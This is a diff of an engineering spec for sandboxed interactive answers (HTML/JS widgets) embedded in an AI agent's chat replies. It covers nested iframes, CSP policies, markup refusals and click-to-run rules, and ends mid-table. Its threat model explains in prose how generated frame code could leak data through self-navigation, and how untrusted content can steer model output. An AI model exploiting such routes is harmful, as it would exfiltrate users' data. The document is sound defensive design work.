@@ -1,8 +1,8 @@
 # Interactive answers (inline UI) — implementation spec
 
-> **Spec, revision 3.1, 2026-10-14.** Adds small interactive answers — charts,
-> calculators, diagrams, comparisons with controls — rendered inside the web
-> chat, next to the reply that produced them. The idea and some code come from
+> **Revision 4, as built, 2026-10-14.** Small interactive answers — charts,
+> calculators, diagrams, comparisons with controls — rendered inside the
+> agent's reply in the web chat and in rooms. The idea and some code come from
 > [CopilotKit/OpenIntelligentUI](https://github.com/CopilotKit/OpenIntelligentUI)
 > (MIT, © Atai Barkai), abbreviated **OIUI**. Its framework (CopilotKit,
 > AG-UI, a Python LangGraph agent, the paid "Jev" visualization router) is
@@ -10,47 +10,48 @@
 > validated bridge from the frame back to the chat, a streaming preview, and
 > the authoring guidance that makes generated UI usable.
 >
-> **Review.** Revision 1 was reviewed against the code by four independent
-> reviewers (security; code accuracy; product and model behaviour; tests,
-> operations and house rules): 95 findings, 9 blockers. Revision 2 was
-> reviewed by two (security; accuracy and consistency): 39 findings, 3
-> blockers. Revision 3 was checked once more (1 blocker, 3 majors, 3 minors).
-> Every verified finding is folded in; Appendix B lists what
-> changed. Problems found outside this feature are in §13 and are not fixed
-> here.
+> **What changed since revision 3.1.** Revision 3.1 specified a tool call
+> (`inline-ui__render`) and left a fenced block in the reply as open question
+> 1. The implementation uses the fenced block (D13 records why), supports
+> rooms and members' space chats (question 2), and records the spike result
+> (D9). Every section below describes the code as it is; the revision log
+> (Appendix B) lists the differences from revision 3.1.
 >
-> **One assumption is unproven and gates the design:** that an outer frame's
-> CSP `frame-src` stops an inner frame from navigating itself to a remote URL,
-> on Chromium, Gecko and WebKit. P1 starts with a spike that proves or
-> disproves it (§5.0); §3-D9 gives the design for both outcomes.
->
-> Every statement about today's code carries a `file:line` reference against
-> `main` at d2f9b65.
+> **Review.** Revisions 1–3.1 were reviewed against the code: four reviewers
+> on revision 1 (95 findings, 9 blockers), two on revision 2 (39 findings,
+> 3 blockers), one check of revision 3 (1 blocker, 3 majors, 3 minors). The
+> pre-existing problems those reviews found (§13) are fixed in the same
+> branch, with more found while implementing.
 >
 > **User-facing name:** "Interactive answer". **Code name:** `inline-ui`.
+> User and operator documentation: [`docs/INLINE-UI.md`](../INLINE-UI.md).
 
 ## Contents
 
-- §1 What exists today
+- §1 What existed before
 - §2 Goals and non-goals
 - §3 Decisions
 - §4 Security invariants and threat model
-- §5 P1 — Spike, tool, storage, frames, history, evaluation
+- §5 P1 — Format, storage, frames, history, evaluation
 - §6 P2 — Suggested follow-ups
 - §7 P3 — Save as live artifact
-- §8 P4 — Streaming preview (conditional)
+- §8 P4 — Streaming preview
 - §9 Guidance
 - §10 Cross-cutting
-- §11 Test plan
-- §12 Delivery
-- §13 Pre-existing issues found in review
+- §11 Tests
+- §12 Delivery and what is open
+- §13 Pre-existing issues found in review and implementation
 - §14 Open questions
 - Appendix A — What is taken from OIUI
 - Appendix B — Revision log
 
 ---
 
-## 1. What exists today
+## 1. What existed before
+
+The facts this design started from, with `file:line` references against
+`main` at d2f9b65, before this work. Several have changed since (the Tauri
+manifest, `toolName` on tool rows, the stale docs); §13 lists those fixes.
 
 ### 1.1 Rendering in the chat
 
@@ -145,21 +146,23 @@ its own page.
 
 **Goals**
 
-- G1. In a personal web chat, the root agent can answer with a small
-  interactive UI that appears with its reply, works, and survives reload.
+- G1. In the web chat — personal chats, members' chats in a space — and in
+  rooms, the root agent can answer with a small interactive UI that appears
+  in its reply, works, and survives reload.
 - G2. Generated code can do nothing outside its frame except what a click in
   the parent app allows.
-- G3. Server-side refusals reach the model as tool errors in the same turn;
+- G3. A block that cannot be shown reaches the model in the same turn;
   client-side failures are visible in the block and reach the model on the
   user's next message, as structured outcomes only.
-- G4. A render's source costs once, not on every later turn.
+- G4. A block's source costs once, not on every later turn.
 - G5. A useful interactive answer can be kept as a live artifact.
-- G6. Use is measured before the feature grows (eval gate after P1).
+- G6. Use is measured (eval suite) before the feature grows.
 
 **Non-goals**
 
 - No agent framework, no visualization router model.
-- Not in TUI, channels, MCP, voice, rooms, spaces or group threads (§14).
+- Not rendered in the TUI, channels, MCP, voice, notifications or group
+  threads: they get one plain line (§5.6).
 - No data sources, refresh or sharing — live artifacts do that.
 - No state that survives re-mounting a frame.
 - No network from a frame, no CDN libraries.
@@ -168,209 +171,191 @@ its own page.
 
 ## 3. Decisions
 
-**D1. One tool group, `inline-ui`, three handlers.** All register with
-`injectSecrets: false`.
-- `inline-ui__render` — action `render`, ALLOW. Params
-  `{ title, height_hint?, css?, html, js? }`; `height_hint` defaults to 320;
-  `html` is checked in the body, not marked `required` (§5.2 truncation).
-- `inline-ui__get` — action `read`, ALLOW, read-only. Source of a block **of
-  the current session only**.
-- `inline-ui__guide` — action `read`, ALLOW, read-only. Optional recipes. The
-  essential contract is in the `render` description (§9.1).
+**D1. A fenced block in the final reply.** The model writes
 
-**D2. Source stored in its own table, fetched by reference.** The tool result
-carries a `ToolResultPreview` of kind `inline_ui` with the block id; the
-browser fetches the source over REST. Keeps the event-bus rule (§1.1) and
-makes reload independent of the one-day `agent_events` retention.
+````text
+```octi-ui title="Loan calculator" height=360
+<style>…</style>
+<div>…</div>
+<script>…</script>
+```
+````
 
-**D3. Timeline entry kind `inline_ui`, anchored to its turn.** Added to
-`src/shared/timeline-order.ts` and the web `TimelineEntry`. Sort key: the
-block's server `createdAt`, which lies inside its root agent's run and so
-before the turn's final reply row (`service.ts:1099`). Live entries use the
-gateway envelope timestamp, clamped like the reply
-(`max(envelope, question + 1)`, `page.tsx:774`); `handleAgentEvent` gains the
-envelope timestamp (`page.tsx:1029-1036`). `MessageTimeline` takes the
-entries through an optional prop, so rooms are unaffected.
+in its final reply. The info string carries `title` (required, ≤ 80
+characters, one line, control and bidi characters removed) and `height`
+(optional, default 320, clamped). The body is split into CSS (the text of
+every top-level `<style>`), markup, and JS (the text of every plain inline
+`<script>`; `<script src>` and non-JS types are refused with a repairable
+issue). A body containing a line of three backticks is fenced with four. One
+read-only tool, `inline-ui__source`, returns an earlier block of the session
+(§5.3). Parsing, markers and fallbacks live in `src/shared/inline-ui/fence.ts`.
 
-**D4. Offered when one predicate holds; the decision travels with the agent.**
-root-runner computes `inlineUiOffered`:
-- root agent;
-- `(await sessionAudience(session)).kind === 'personal'`;
-- the client declared `renders: ['inline_ui']` for this turn (D14);
-- not small-tier;
-- no stored DENY on tool `inline-ui` for the user (kill switch, §10.4);
-- the root model is not a CLI provider (`isCLIProvider`,
-  `src/core/cli-agent-factory.ts:9`): a vendor CLI keeps its own resumable
-  transcript (`src/core/cli-compaction.ts:16-20`), which D12 cannot stub, and
-  receives root tools through the MCP bridge (`src/core/cli-agent-worker.ts:241-276`).
+**D2. Source stored in its own table; a marker stays in the reply.** At the
+end of the root agent's run each fence is stored in `inline_ui_blocks` and
+replaced by the line `[[octi-ui:<uuid>|<title>]]`. The web fetches the
+source by id over REST. The event bus and every copy of the reply carry the
+marker, never the source; reload does not depend on `agent_events`
+retention.
 
-It stores the result as `context.metadata.inlineUiOffered = true` on the root
-`AgentContext`. `render` requires `context.root === true &&
-context.metadata?.inlineUiOffered === true` plus a fresh stored-DENY check,
-else `ToolNotExecutedError`. Children, rooms, spaces, group threads, remote
-rooms and old clients never get the tool, whatever a role row lists.
-Lite-tier models are offered it; the eval decides (§5.10).
+**D3. Placement is the marker's place in the reply.** The web splits an
+assistant message into text and marker segments and renders a block where
+its marker is (`AssistantContent`), so a block is always inside its reply,
+in order, with no timeline kind and no clock to reconcile. A marker line
+inside a code fence is text, not a block.
+
+**D4. Offered when one predicate holds** (`inlineUiOffered`,
+`src/core/inline-ui/offer.ts`, unit-tested as a matrix):
+- root agent, not small-tier, not a vendor CLI root (its own transcript
+  cannot be stubbed, D12), no stored DENY on tool `inline-ui` action
+  `render` (the kill switch);
+- **room**: always — members read a room in the web app, whoever's turn it
+  was; a room bridged to a platform thread gets the fallback line there;
+- **personal** and **space** (a member's own chat in a space): when the
+  client declared `renders: ['inline_ui']` for the turn (D14);
+- **group** threads and **remote-space** sessions: never (the first answers
+  on its platform; the second stores nothing outside its own rows).
+
+root-runner computes it after `rootIsSmall` and stores
+`context.metadata.inlineUiOffered`. The source tool and the repair round
+(D12) check it again; children never see it.
 
 **D5. Added by root-runner, not through a role.** A client capability, not a
-role capability; customized `general` rows never receive new tools or prompt
-lines (`src/db/seed-roles.ts:50-75`). After `rootIsSmall`
-(`root-runner.ts:349`): if offered, append the handlers to `rootTools`; if not
-offered, filter any `inline-ui` handlers a customized role row brought in. In
-the lazy core-id literal (`:413`) add `...(inlineUi ? ['inline-ui'] : [])`.
-Not added to `rootAllowedToolIds` (children). `'inline-ui'` joins
-`PERSONAL_ONLY_TOOL_IDS` (`src/security/space-tools.ts:139`).
+role capability. When offered: the prompt section `INLINE_UI_PROMPT` joins
+the root prompt's static (cacheable) part, the `inline-ui` handlers join the
+root's tools and the lazy core ids; when not offered, `inline-ui` handlers a
+customised role row brought in are filtered out. Children never receive it.
 
 **D6. Two nested frames; generated content is data; only the inner frame ever
-holds it.**
+holds it.** (`src/shared/inline-ui/frames.ts`)
 
 ```
 chat page ──iframe sandbox=allow-scripts srcdoc=HOST──▶ host frame (our code only)
-                                                         CSP: script-src 'nonce-H'; frame-src <inner only>
-                                                         └─iframe sandbox=allow-scripts──▶ content frame
+                                                         CSP: script-src 'nonce-H' 'nonce-C'; frame-src 'none'
+                                                         └─iframe sandbox=allow-scripts srcdoc=CONTENT──▶ content frame
                                                               CSP: script-src 'nonce-C'; no network
                                                               runtime (ours) + sanitized html + css [+ js]
 ```
 
-- The **host frame** is a constant document built by the parent from
-  constants only, plus the payload `{ mode, css, html, js, nonceC }` as a JSON
-  literal in which every `<` is replaced by the JSON escape sequence for
-  U+003C (backslash, `u`, `0`, `0`, `3`, `c`) and U+2028/U+2029 likewise. The
+- The **host document** is a constant plus a JSON payload in which every `<`
+  and U+2028/U+2029 are escaped (`jsonForScript`, `src/shared/html.ts`). The
   host never inserts generated markup into its own document. It creates the
-  content frame, observes it (load events, CSP violation events), relays its
-  messages to the chat page after validation, and is the only frame the chat
-  page listens to.
-- The **content frame** is built by the host from a second constant document
-  (its runtime) plus the same payload. The runtime, before anything generated
-  enters the document, caches every DOM method and object it will use
-  (`document.createElement`, `querySelectorAll`, `TreeWalker`, `postMessage`,
-  `parent`, `JSON`, `Function.prototype` methods) and then:
-  1. parses `html` with `template.innerHTML` (inert, scripts marked
-     already-started, nothing loads), walks it with a `TreeWalker` including
-     nested `template.content`, applies §4.3, and moves the result into
-     `<body>`;
-  2. sets a `<style>` element's `textContent` to `css`;
-  3. in scripted mode, creates a `<script>` with nonce C and `textContent = js`.
-- Parser breakouts (`</style>` in css, `</script>` or `<!--` in js,
-  `<plaintext>`/`<textarea>`/`<title>` in html) cannot occur: no generated
-  text is ever concatenated into markup. The browser's parser is the
-  sanitizer's parser; no parser dependency is added.
-- Generated code shares a realm only with the content runtime, never with the
-  host. So it can forge or suppress content-frame messages, but not host
-  signals: navigation stops, CSP violations and flood detection are observed
-  by the host from outside.
-- Two modes: **static** (no `js`; no generated code ever runs) and
-  **scripted**.
+  content frame from the content document, observes it (load events, message
+  rate), relays validated messages, and is the only frame the chat page
+  listens to.
+- The **content runtime** runs first under nonce C, caches the DOM methods
+  and objects it uses, then: parses the markup with `template.innerHTML`
+  (inert), walks it with `querySelectorAll('*')` and applies §4.3
+  (`template` itself is refused, so nothing hides in nested template
+  content), moves the result into `<body>`, sets a `<style>` element's text
+  to the CSS, wires links, height, errors and `octi`, and in scripted mode
+  attaches the JS last as a `<script>` with nonce C.
+- Parser breakouts cannot occur: no generated text is concatenated into
+  markup. The browser's parser is the sanitizer's parser.
+- Generated code shares a realm only with the content runtime, never with
+  the host: it can forge or suppress content messages, not host signals.
+- Two modes: **static** (no JS; no generated code runs) and **scripted**.
+- No `allow` attribute: Chromium logs a console error for every `'none'`
+  entry on every frame, and the sandbox with an opaque origin already
+  withholds every feature whose default allowlist is `self`. Videos get
+  `disablepictureinpicture`.
 
 **D7. No network from a frame.** Both CSPs deny every fetch and every remote
-image, font, stylesheet, script, frame and worker. OIUI allows four CDNs and
-`'unsafe-eval'`; that would let generated code send anything anywhere and
-pull arbitrary code. Charts are SVG or canvas written by the model.
+image, font, stylesheet, script, frame and worker. Charts are SVG or canvas
+written by the model.
 
 **D8. Nothing leaves the chat page without a click in the chat page.**
-- Links: no live `href` ever exists in the content frame (§4.3); the runtime
-  turns link activation into a `link` message; the chat page shows the URL in
-  a chip with a real link (P1).
-- Follow-ups (P2): the frame suggests a message; the chat page draws a
-  suggestion strip outside the frame, with `[Send] [Edit in composer]
-  [Dismiss]`. Send is a click in the chat page.
+- Links: no live `href` exists in the content frame (§4.3); activation
+  becomes a `link` message; the chat page shows the URL in a chip with a real
+  link (`target="_blank" rel="noopener noreferrer"`).
+- Follow-ups (§6): the frame suggests a message; the chat page draws a strip
+  outside the frame with **Send**, **Edit in composer**, **Dismiss**.
 
 OIUI sends and opens directly. We diverge because generated code is model
 output that untrusted content can steer, and a sent message counts as the
-user's own words and can steer a running turn (§1.3).
+user's own words.
 
-**D9. Self-navigation: contained by the host frame, or treated as write egress.**
-A scripted content frame can try to navigate itself to a URL carrying data
-(a 204 response commits nothing, so it can repeat; a 200 response puts a
-remote page with full network inside the chat area). Revision 2 claimed no
-CSP directive governs this; that was wrong: the embedder's `frame-src` is
-checked on navigations of its child frames in Chromium and Gecko.
+**D9. Self-navigation: contained by the host frame on Chromium; click-to-run
+elsewhere.** The spike (`tests/web/inline-ui-frames.spec.ts`) shows on
+Chromium that the host's `frame-src 'none'` blocks the content frame's own
+navigation to an `https:` URL answered with 200 and with 204 — no request
+reaches the route — and that the `srcdoc` content frame itself still loads.
+The host stops a block when it sees a second content `load`; signals from the
+content realm are never relied on. Firefox and WebKit were not available to
+the spike, so a scripted block waits for a click on any engine that is not
+Chromium (`navigator.userAgentData.brands`; D10). Because a block is text in
+a reply, not a tool call, there is no egress classification: the session's
+flow label is recorded on the block when it is stored (`tainted`, `risk`)
+and drives D10 and §7.
 
-- **If the spike (§5.0) shows the host's `frame-src` blocks the content
-  frame's navigation to any `http(s):` URL on Chromium, Gecko and WebKit:**
-  a scripted render has **no egress**. The block is stopped when the host
-  observes a violation in its own realm or a content-frame `load` after the
-  first; events in the content realm are never relied on (generated code
-  lives there). If an engine offers neither signal, navigation is still
-  blocked and the block shows no stop reason.
-- **Otherwise:** a scripted render is **`write` egress** in `classifyFlow`
-  (a browser GET can carry any data to any host — write-like; this also
-  covers private+suspicious, `flow-guard.ts:486`), every scripted block is
-  click-to-run (D10), and the host stops the block on any content-frame
-  `load` after the first.
-
-In both cases: `isVaultAuthenticated` returns false for `toolId ===
-'inline-ui'`, and `render` refuses any `{{secret:` placeholder. A static
-render has no egress: no live link, no script, no pragma (§4.3).
-
-**D10. Click-to-run.** A scripted block mounts with its html and css shown and
-a chat-page-drawn "Run interactive answer" button, instead of running, when
+**D10. Click-to-run.** A scripted block mounts with its markup shown and a
+chat-page-drawn "Run interactive answer" button, instead of running, when
 any holds:
-- loaded from history (a block that hangs the tab would otherwise hang the
-  session on every reload, T6);
-- rendered while the session label had `suspicious`, `private` or `secret`
-  (stored as `tainted`);
-- the viewer is impersonating;
-- the freeze marker for the block survived (§5.6);
-- the D9 fallback applies.
+- it was not received live on this page (history);
+- the conversation is shared (a room: one member's question shapes what
+  everyone runs);
+- `tainted` — the session had read outside content, private data or a secret
+  when the block was stored; with `risk = high` (a secret, or private data
+  together with outside content) the prompt is a red warning;
+- the viewer is an admin acting as the user;
+- the freeze marker for the block survived (§5.5);
+- containment is not verified on this engine (D9).
 
-A static block runs no generated code, but it can still hang rendering
-through CSS/SVG (T6); it follows the freeze marker rule and the §4.4 caps.
+A static block runs no generated code; it follows the freeze-marker rule.
 
-**D11. Shared, pure helpers in `src/shared/inline-ui/`.** Host and content
-document builders, CSP strings, runtime sources, the string lint, the
-partial-JSON extractor, the bridge validator, limits, theme tokens. No
-runtime imports; browser APIs only through `globalThis` (`web/tsconfig.json`
-compiles shared files without Node types). The esbuild syntax check is
-server-only, in `src/tools/inline-ui/syntax.ts`.
+**D11. Shared, pure helpers in `src/shared/inline-ui/`** — fence parsing,
+markers and fallbacks, lint, limits, theme tokens, frame documents and
+runtimes, bridge validation — with no runtime imports, so the web and the
+server use the same code. The esbuild syntax check is server-only
+(`src/core/inline-ui/extract.ts`).
 
-**D12. At turn end, render sources leave history.** When the snapshot is
-written (`agent-worker.ts:797-808`), for every message in `this.messages`:
-- an `inline-ui__render` call that succeeded: arguments become
-  `{ "id": "<uuid>", "stored": true }`;
-- one that failed: arguments become `{ "stored": false, "error": "<code>" }`;
-- an `inline-ui__get` tool result becomes `{ "id": "<uuid>", "fetched": true }`;
-- and the `providerRaw` of each such assistant message is dropped, because
-  Anthropic and Gemini replay tool inputs from it (§1.3). Prior-turn
-  signatures are not needed for replay; dropping `providerRaw` is a state
-  replay already supports (`agent-worker.ts:582`).
+**D12. Sources leave history at the end of the turn; one repair round.**
+- **Repair.** When the final reply has a block that cannot be shown as
+  written (fatal: cut off, empty, too large, a script that does not parse)
+  or would lose parts (repairable: inline handlers, remote resources, forms,
+  `<script src>`…), the worker appends the draft and a message saying what
+  is wrong and asks once more, in the same turn (G3).
+- **Extraction.** When the root agent finishes, before the snapshot, the
+  message row or any event keeps a copy, `storeInlineUiBlocks` stores each
+  acceptable fence and puts a marker in its place; a block that still cannot
+  be shown becomes a visible notice (`> ⚠ Interactive answer “T” could not be
+  shown: …`). It is idempotent; the service runs it again on whatever reaches
+  it (a CLI root, a plan path).
+- **Snapshot.** The final assistant message in the native snapshot holds the
+  markers; fences in earlier iterations (text beside a tool call, a repaired
+  draft) are replaced by their one-line form; and the `providerRaw` of every
+  changed message is dropped, because Anthropic and Gemini replay it.
+- Later turns see `[[octi-ui:<id>|<title>]]`; `inline-ui__source` fetches
+  the source when the model wants to change a block.
 
-Stubbed messages carry a marker so the Gemini replay warning
-(`src/models/providers/gemini-provider.ts:175`) is not logged for them on
-every later turn. The stub is applied to the mapped copy before
-`capNativeSnapshot`. Within the turn nothing is edited: the current tool-use cycle and its signed
-blocks stay intact, and a failed render keeps its arguments so the model can
-fix them. When the snapshot is not usable, the final assistant row's
-`metadata.promptContext` carries `(system note: interactive answers shown in
-this reply: <uuid>, <uuid>)` — ids only; titles are model-controlled text.
+**D13. A fenced block, not a tool call.** Revision 3.1 chose a tool call and
+kept the fenced block as an open question. Implementing it showed the
+block is the better fit:
+- it streams on every provider over `chat.delta`, so the preview (§8) needs
+  no tool-argument streaming, which most providers deliver in one chunk;
+- HTML is not escaped inside JSON, and a cut-off block is detected by its
+  missing closing fence;
+- G3 holds through the repair round (D12) instead of a tool error;
+- the flow label is recorded at extraction, and the kill switch works at the
+  offer (D4) — the two things per-call permissions gave the tool call;
+- the cost — every surface that is not the web must not show raw markup — is
+  met by one fallback function applied at each of them (§5.6) and by
+  extraction before anything keeps the reply.
 
-**D13. A tool call, not a fenced block in the reply.** The alternative — the
-model writes the UI as a fenced block in its text, which would stream for
-free over `chat.delta` — was considered and rejected for this spec:
-- a tool call returns validation errors to the model in the same turn (G3);
-- per-call permissions, stored DENY, flow guard and approval apply to calls;
-- `chat.delta` reaches every client of the session including the TUI, and
-  final text reaches channels; raw markup would need stripping everywhere.
+**D14. Clients declare what they can render.** `chat.send` takes optional
+`renders: ['inline_ui']` (Zod); `handleMessage` takes a trailing
+`inlineUi?: { renders, notes, provenanceId }` and puts it into `RunContext`
+(`renders`, `inlineUiNotes`, `inlineUiProvenance`). The web declares it over
+the gateway. The REST fallback does not: it runs when the tab cannot hear the
+gateway, so the block would not appear live — and since it sends no channel
+it is unattended (§13-7). `POST /api/chat` accepts `renders` for the eval
+runner and keeps markers in its response only then. Rooms need no
+declaration (D4).
 
-It stays §14-Q1 because it would stream on providers that deliver tool
-arguments in one chunk.
-
-**D14. Clients declare what they can render.** `chat.send` gains an optional
-`renders: ['inline_ui']` (Zod). `AgentService.handleMessage` (positional,
-`service.ts:222-235`) gains one trailing option
-`inlineUi?: { renders, reports, provenance }`; `renders` set into `RunContext.renders` (new readonly field,
-`run-context.ts:21-30`) in the `runWithContext` call (`service.ts:276`);
-root-runner and the tool read `getRunContext()?.renders`. The web declares it
-over the gateway only. The REST fallback declares nothing: it runs when the
-tab cannot hear the gateway (§1.4), so the block would not appear live, and
-making that turn attended would publish approvals nobody can hear. Old tabs,
-TUI, channels, MCP and eval runs that do not opt in are never offered the
-tool.
-
-**D15. Promotion uses the tool's version writer, moved to core, and a strict
-artifact network policy.** `writeVersion` (`src/tools/artifacts/index.ts:67-112`)
-moves to `src/core/artifacts/` in a refactor PR. Promoted artifacts get a
-`network = 'none'` flag that makes `buildEmbedCsp` emit `img-src data: blob:;
-connect-src 'none'`. P3 depends on fixing §13-1 first.
+**D15. Promotion uses the artifact version writer and a closed network
+policy.** `writeVersion` lives in `src/core/artifacts/version-writer.ts`
+and is used by the tool, the REST routes and promotion. Promoted artifacts
+have `network = 'none'`: the embed CSP gets `connect-src 'none'` and
+`img-src data: blob:`, and the page carries no SDK, gateway or token (§7).
 
 ---
 
@@ -380,528 +365,364 @@ connect-src 'none'`. P3 depends on fixing §13-1 first.
 
 | # | Invariant | Mechanism |
 |---|---|---|
-| S1 | Generated code never runs with the app's origin, cookies or storage | Both frames `sandbox="allow-scripts"` without `allow-same-origin` → opaque origins; `srcdoc` |
+| S1 | Generated code never runs with the app's origin, cookies or storage | Both frames `sandbox="allow-scripts"` without `allow-same-origin`, `srcdoc` |
 | S2 | No fetch; no remote script, style, font, image, media, frame or worker | §4.2 CSPs, first element of each `<head>`, in constant documents (D6) |
-| S3 | No popups, forms, top or sibling navigation, modals, downloads, device features | Sandbox flags (only `allow-scripts`); `allow` denies every policy-controlled feature whose default allowlist is not `'none'` (§4.2); runtime strips `autofocus` |
-| S4 | Static mode cannot navigate; scripted navigation is blocked (D9 spike) or stops the block (fallback) | No live `href` (§4.3); pragmas stripped; DNS prefetch off; host `frame-src`; host observes the content frame |
-| S5 | The chat page acts only on host-frame messages of known shape and rate | `event.source === hostIframe.contentWindow`; the host accepts only `event.source === contentIframe.contentWindow`; per-mount correlation id (readable by generated code — not a secret); validator `src/shared/inline-ui/bridge.ts`; §4.4 rates; > 20 invalid or over-limit messages per second → unmount |
-| S6 | Nothing is sent or opened without a click in the chat page | D8. Strip and chip buttons ignore input for 800 ms after they appear or move; the frame's height is locked while a strip is open; the strip sits at a fixed place below the frame. `navigator.userActivation` is **not** relied on: activation propagates from any frame to its ancestors, so it only proves "a recent click somewhere". Suggestion text is cleaned of C0/C1, bidi (U+202A–202E, U+2066–2069) and zero-width (U+200B–200F) characters |
-| S7 | Refused markup is reported to the model (lint) and removed by the runtime (boundary, with CSP) | §4.3 |
-| S8 | Only the session owner reads a block | `scopedRepos(principal).sessions.findById(sessionId)` then `getInSession(blockId, sessionId)`; 404 otherwise; `cache-control: no-store` |
+| S3 | No popups, forms, top or sibling navigation, modals, downloads | Sandbox flags (only `allow-scripts`); opaque origin withholds `self`-default features (D6); runtime strips `autofocus` |
+| S4 | Content cannot navigate (Chromium); elsewhere scripts wait for a click | No live `href` (§4.3); host `frame-src 'none'`; host stops on a second content load; D9, D10 |
+| S5 | The chat page acts only on host-frame messages of known shape and rate | `event.source` check; per-mount channel (readable by generated code — not a secret); `parseInlineUiHostMessage`; §4.4 rates; > 20 invalid messages per second unmount |
+| S6 | Nothing is sent or opened without a click in the chat page | D8. Strip and chip buttons ignore input for 800 ms after they appear; frame height locked while a strip is open; suggestion text cleaned of C0/C1, bidi and zero-width characters (`cleanSuggestedText`) |
+| S7 | Refused markup is reported to the model (lint, repair round) and removed by the runtime | §4.3 |
+| S8 | Only those who may read the conversation read a block | `inlineUiReader`: the scoped session read of the chat routes (`contentRepos`), or `roomAccess`; a remote room through the federation op `room.inline_ui` (`roomAccess` and the room's space); block id must belong to that session; 404 otherwise; `cache-control: no-store` |
 | S9 | Sizes and rates are bounded | §4.4 |
-| S10 | Flow guard sees what a scripted render can do | D9 |
-| S11 | Vault secrets never enter a block | `injectSecrets: false`; `{{secret:` refused; no vault exemption |
-| S12 | A frame cannot impersonate the app | Chat-page-drawn border and header; footer "Made by the agent · don't enter passwords or keys here"; height ≤ min(2 000 px, 80 vh); a chat-page spacer between the last block and the composer/permission banner; password and file inputs refused and stripped; `-webkit-text-security` refused |
-| S13 | Desktop IPC is unreachable from either frame | `build.rs` declares `AppManifest::new().commands(&["get_backend_url","set_backend_url"])` with permissions granted only to the main window; the command handlers check the IPC origin; a desktop test calls `set_backend_url` from a scripted content frame on WebKitGTK, WKWebView and WebView2 and expects refusal |
-| S14 | Focus cannot be stolen while the user types | The chat page detects focus moving into a frame without a preceding pointerdown or Tab, returns focus to where it was and stops the block — the one case where the chat page moves focus on its own |
+| S10 | What the session had read is visible where it matters | `tainted` / `risk` recorded at extraction from `getFlowLabel`; D10; promotion refused for `tainted` (§7) |
+| S11 | Vault secrets never enter a block | Placeholders are not resolved in replies; `inline-ui__source` has `injectSecrets: false` |
+| S12 | A frame cannot impersonate the app | Chat-page-drawn border, header and footer ("Made by the agent · don't enter passwords or keys here"); height ≤ min(2 000 px, 80 vh); password and file inputs replaced; `text-security` removed |
+| S13 | Desktop IPC is unreachable from either frame | App commands declared in an `AppManifest` and granted to the main window only; Tauri refuses app commands to remote origins; the frames are opaque-origin `srcdoc` documents without the invoke key; the webview has no store permission (§13-8) |
+| S14 | Focus cannot be stolen while the user types | The chat page watches focus moving into a frame: a theft is a page keystroke within the last second, or no user activation (Tab exempt); focus returns to where it was and the block stops |
 
 ### 4.2 Frame policies
 
-Host frame CSP (`H` = per-mount nonce from `crypto.getRandomValues`):
+Host frame CSP (`H`, `C` = per-mount nonces from `crypto.getRandomValues`):
 
 ```
 default-src 'none'; script-src 'nonce-H' 'nonce-C'; style-src 'unsafe-inline';
-img-src data: blob:; font-src data:; media-src data: blob:;
-frame-src <spike result>; connect-src 'none'; form-action 'none'; base-uri 'none'
+img-src data: blob:; font-src data:; media-src data: blob:; connect-src 'none';
+frame-src 'none'; child-src 'none'; worker-src 'none'; manifest-src 'none';
+form-action 'none'; base-uri 'none'
 ```
 
-**Inheritance rule.** A `srcdoc` document copies its creator's policy
-container, and a `blob:` document gets the policy container of the context
-that made the blob. So the host CSP is also enforced inside the content
-frame, on top of the content frame's own meta CSP. **The host CSP must
-therefore allow everything the content CSP allows** (nonce C, `data:`/`blob:`
-images and media, `data:` fonts). This is safe because the host never inserts
-generated markup. A unit test checks that the content CSP's allowances are a
-subset of the host CSP's. The alternative, a `data:` URL content frame
-(empty policy container, `frame-src data:`), is evaluated in the spike.
-
-Content frame CSP (`C` = second per-mount nonce):
+Content frame CSP:
 
 ```
 default-src 'none'; script-src 'nonce-C'; style-src 'unsafe-inline';
-img-src data: blob:; font-src data:; media-src data: blob:;
-connect-src 'none'; frame-src 'none'; child-src 'none'; worker-src 'none';
-manifest-src 'none'; form-action 'none'; base-uri 'none'
+img-src data: blob:; font-src data:; media-src data: blob:; connect-src 'none';
+frame-src 'none'; child-src 'none'; worker-src 'none'; manifest-src 'none';
+form-action 'none'; base-uri 'none'
 ```
 
-Inline event-handler attributes and `javascript:` URLs cannot run (no
-`'unsafe-inline'`, no `'unsafe-hashes'`); the guide tells the model to use
-`addEventListener`. No `'unsafe-eval'`. Generated js, once running, can read
-nonce C; that grants nothing it does not already have.
+A `srcdoc` document copies its creator's policy container, so the content
+frame enforces the host CSP as well as its own; the host allows exactly what
+the content needs (a unit test checks the subset). `frame-src 'none'` still
+lets the host create its `srcdoc` child (spike). Inline handlers and
+`javascript:` URLs cannot run (no `'unsafe-inline'` for scripts, no
+`'unsafe-hashes'`); no `'unsafe-eval'`.
 
-Head order in both: CSP · `<meta name="referrer" content="no-referrer">` ·
-`<meta http-equiv="x-dns-prefetch-control" content="off">` · charset ·
-`color-scheme: dark` · `<style>` · runtime `<script nonce>`.
-
-Both iframes: `sandbox="allow-scripts"`, `referrerpolicy="no-referrer"`,
-`title`, and an `allow` attribute generated from a list in
-`src/shared/inline-ui/permissions-policy.ts` that sets `'none'` for every
-policy-controlled feature with a non-`'none'` default (including
-`attribution-reporting`, `browsing-topics`, `clipboard-write`,
-`join-ad-interest-group`, `local-fonts`, `picture-in-picture`,
-`private-state-token-*`, `run-ad-auction`, `shared-storage*`,
-`storage-access`, `sync-xhr`, `window-management`, and all device features).
-A test reads `document.featurePolicy.allowedFeatures()` inside the content
-frame where supported and expects it empty.
-
-A `srcdoc` document snapshots its parent's policy container when created. The
-SPA sets no CSP today; a future SPA or desktop CSP without nonce support
-would break the frames. A test pins the SPA headers (§11).
+Head order in both: CSP · `referrer no-referrer` · `x-dns-prefetch-control
+off` · charset · base CSS · runtime `<script nonce>`. Both iframes:
+`sandbox="allow-scripts"`, `referrerpolicy="no-referrer"`, `title`.
 
 ### 4.3 Refusals (S7)
 
-The server lint gives the model a specific error. The content runtime
-enforces the same rules on the parsed DOM, so a lint bypass gains nothing.
+The server lint (`lintInlineUi`) tells the model; the content runtime enforces
+the same rules on the parsed DOM, so a lint bypass gains nothing. The refused
+elements and dropped attributes are one list each
+(`INLINE_UI_REFUSED_ELEMENTS`, `INLINE_UI_DROPPED_ATTRIBUTES`), read by the
+runtime and by the server sanitizer for saved copies (§7).
 
-| Field | Refused (case-insensitive) | Runtime action |
+| Field | Refused | Runtime action |
 |---|---|---|
